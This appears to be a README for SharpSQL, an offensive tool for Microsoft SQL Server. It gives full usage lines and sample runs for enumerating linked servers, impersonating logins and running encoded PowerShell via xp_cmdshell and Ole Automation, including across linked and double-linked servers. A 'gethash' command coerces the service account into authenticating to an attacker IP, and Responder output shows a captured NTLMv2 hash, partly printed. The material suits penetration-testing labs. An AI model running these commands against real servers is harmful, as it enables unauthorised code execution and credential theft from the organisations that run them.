# SharpSQL

----

### Command Line Usage


    ███████ ██   ██  █████  ██████  ██████  ███████  ██████  ██
    ██      ██   ██ ██   ██ ██   ██ ██   ██ ██      ██    ██ ██
    ███████ ███████ ███████ ██████  ██████  ███████ ██    ██ ██
         ██ ██   ██ ██   ██ ██   ██ ██           ██ ██ ▄▄ ██ ██
    ███████ ██   ██ ██   ██ ██   ██ ██      ███████  ██████  ███████
                                                        ▀▀
    Written By: Jb05s | Version: 1.1.0

    MSSQL Authenticated Server Enumeration and Impersonation:
        [1] Retrieve a List of Linked SQL Servers on the Connected SQL Server:
            SharpSQL.exe getlinked /db:DATABASE /server:SERVER [/sqlauth /user:SQLUSER /password:SQLPASSWORD]
        [2] Retrieve Information on SQL Login, Mapped User, and Available User Roles:
            SharpSQL.exe getdbuser /db:DATABASE /server:SERVER [/impersonate] [/sqlauth /user:SQLUSER /password:SQLPASSWORD]
        [3] Retrieve SQL Logins Available for Impersonation and Impersonate the Available Login:
            SharpSQL.exe getlogin /db:DATABASE /server:SERVER [/impersonate] [/sqlauth /user:SQLUSER /password:SQLPASSWORD]
        [4] Retrieve the Net-NTLM Hash for the Service Account of the Connected SQL Server:
            SharpSQL.exe gethash /db:DATABASE /server:SERVER /ip:ATTACKERIP [/sqlauth /user:SQLUSER /password:SQLPASSWORD]

    MSSQL Command Execution:
        [1] Execute Encoded PowerShell Command via 'xp_cmdshell':
            SharpSQL.exe xp /db:DATABASE /server:SERVER /command:COMMAND [/sqlauth /user:SQLUSER /password:SQLPASSWORD]
        [2] Execute Encoded PowerShell Command via 'Ole Automation Procedures':
            SharpSQL.exe ole /db:DATABASE /server:SERVER /command:COMMAND [/sqlauth /user:SQLUSER /password:SQLPASSWORD]
    MSSQL Linked Server Command Execution:
        [1] Execute Encoded PowerShell Command on Linked SQL Server via 'xp_cmdshell' with 'OPENQUERY':
            SharpSQL.exe linkedquery /db:DATABASE /server:SERVER /target:TARGET /command:COMMAND [/sqlauth /user:SQLUSER /password:SQLPASSWORD]
        [2] Execute Encoded PowerShell Command on Linked SQL Server via 'xp_cmdshell':
            SharpSQL.exe linkedxp /db:DATABASE /server:SERVER /target:TARGET /command:COMMAND [/sqlauth /user:SQLUSER /password:SQLPASSWORD]
        [3] Configure Linked SQL Server to Allow RPC connections:
            SharpSQL.exe rpc /db:DATABASE /server:SERVER /target:TARGET [/sqlauth /user:SQLUSER /password:SQLPASSWORD]
    MSSQL Double Linked Server Command Execution:
        [1] Execute Encoded PowerShell Command on a Double Linked SQL Server via 'xp_cmdshell':
            SharpSQL.exe dbllinkedxp /db:DATABASE /server:SERVER /intermediate:INTERMEDIATE /target:TARGET /command:COMMAND [/sqlauth /user:SQLUSER /password:SQLPASSWORD]


### getlinked

    C:\SharpSQL>SharpSQL.exe getlinked /db:master /server:SQL1

    ███████ ██   ██  █████  ██████  ██████  ███████  ██████  ██
    ██      ██   ██ ██   ██ ██   ██ ██   ██ ██      ██    ██ ██
    ███████ ███████ ███████ ██████  ██████  ███████ ██    ██ ██
         ██ ██   ██ ██   ██ ██   ██ ██           ██ ██ ▄▄ ██ ██
    ███████ ██   ██ ██   ██ ██   ██ ██      ███████  ██████  ███████
                                                        ▀▀
    Written By: Jb05s | Version: 1.1.0

    [*] Action: Retrieve Linked Servers
        Usage: SharpSQL.exe getlinked /db:DATABASE /server:SERVER [/sqlauth /user:SQLUSER /password:SQLPASSWORD]

    [+] Authentication to the 'master' Database on 'SQL1' Successful!
    [*] Linked SQL server: SQL2
    [*] Linked SQL server: SQL1\SQLEXPRESS


### getdbuser

    C:\SharpSQL>SharpSQL.exe getdbuser /db:master /server:SQL1

    ███████ ██   ██  █████  ██████  ██████  ███████  ██████  ██
    ██      ██   ██ ██   ██ ██   ██ ██   ██ ██      ██    ██ ██
    ███████ ███████ ███████ ██████  ██████  ███████ ██    ██ ██
         ██ ██   ██ ██   ██ ██   ██ ██           ██ ██ ▄▄ ██ ██
    ███████ ██   ██ ██   ██ ██   ██ ██      ███████  ██████  ███████
                                                        ▀▀
    Written By: Jb05s | Version: 1.1.0

    [*] Action: Retrieve Information on the SQL Login, Currently Mapped User, and Available User Roles
        Usage: SharpSQL.exe getdbuser /db:DATABASE /server:SERVER [/impersonate] [/sqlauth /user:SQLUSER /password:SQLPASSWORD]

    [+] Authentication to the 'master' Database on 'SQL1' Successful!
    [+] Logged in as: SQL1\Administrator
    [+] Mapped to user: dbo
    [+] User is a member of the 'Public' role
    [+] User is a member of the 'sysadmin' role


### getlogin

    C:\SharpSQL>SharpSQL.exe getlogin /db:master /server:SQL1

    ███████ ██   ██  █████  ██████  ██████  ███████  ██████  ██
    ██      ██   ██ ██   ██ ██   ██ ██   ██ ██      ██    ██ ██
    ███████ ███████ ███████ ██████  ██████  ███████ ██    ██ ██
         ██ ██   ██ ██   ██ ██   ██ ██           ██ ██ ▄▄ ██ ██
    ███████ ██   ██ ██   ██ ██   ██ ██      ███████  ██████  ███████
                                                        ▀▀
    Written By: Jb05s | Version: 1.1.0

    [*] Action: Retrieve SQL Logins Available for Impersonation
        Usage: SharpSQL.exe getlogin /db:DATABASE /server:SERVER [/impersonate] [/sqlauth /user:SQLUSER /password:SQLPASSWORD]

    [+] Authentication to the 'master' Database on 'SQL1' Successful!
    [+] Logged in as: SQL1\Administrator


### gethash

    C:\Users\Administrator>SharpSQL.exe gethash /db:master /server:web06 /ip:192.168.49.61

    ███████ ██   ██  █████  ██████  ██████  ███████  ██████  ██
    ██      ██   ██ ██   ██ ██   ██ ██   ██ ██      ██    ██ ██
    ███████ ███████ ███████ ██████  ██████  ███████ ██    ██ ██
         ██ ██   ██ ██   ██ ██   ██ ██           ██ ██ ▄▄ ██ ██
    ███████ ██   ██ ██   ██ ██   ██ ██      ███████  ██████  ███████
                                                        ▀▀
    Written By: Jb05s | Version: 1.1.0

    [*] Action: Retrieve Net-NTLM Hash for Service Account
        Usage: SharpSQL.exe gethash /db:DATABASE /server:SERVER /ip:ATTACKERIP [/sqlauth /user:SQLUSER /password:SQLPASSWORD]

    [+] Authentication to the 'master' Database on 'web06' Successful!

    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-

    [10/06/21 2:23:49]
    (root💀jb05s)-[~/tools/Responder]
    └─# python3 ./Responder.py -I tun0                                                                
                                         __
      .----.-----.-----.-----.-----.-----.--|  |.-----.----.
      |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
      |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                       |__|

           NBT-NS, LLMNR & MDNS Responder 3.0.6.0

      Author: Laurent Gaffie (laurent.gaffie@gmail.com)
      To kill this script hit CTRL-C

    [+] Poisoners:
    ...
    [+] Servers:
    ...
    [+] HTTP Options:
    ...
    [+] Poisoning Options:
    ...
    [+] Generic Options:
    ...
    [+] Current Session Variables:
    ...

    [+] Listening for events...                                                                                                                                                           

    [SMB] NTLMv2-SSP Client   : 10.0.0.5
    [SMB] NTLMv2-SSP Username : JB05S\SQLSvc
    [SMB] NTLMv2-SSP Hash     : SQLSvc::JB05S:1e9bb47f248b4395:BF0D807BE57380FDDCFC5E87C8ED3894:...